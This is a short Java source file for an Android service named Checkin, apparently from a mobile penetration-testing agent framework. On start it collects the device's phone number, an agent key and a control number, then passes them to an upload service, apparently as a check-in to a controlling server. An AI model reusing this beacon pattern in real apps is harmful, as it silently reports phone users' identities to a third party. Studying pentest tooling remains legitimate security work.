package com.bulbsecurity.framework;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;

public class Checkin extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		Context context = getApplicationContext();
		String key = ((AndroidAgent)this.getApplication()).getkey();
		String controlnumber = ((AndroidAgent) this.getApplication()).getcontrolNumber();
		TelephonyManager num = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		String number = num.getLine1Number();
	String facts = key + "," + number + ",Android," + controlnumber;
	Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
	intent2.putExtra("uploadstring",facts );
	
	context.startService(intent2);

	}
}
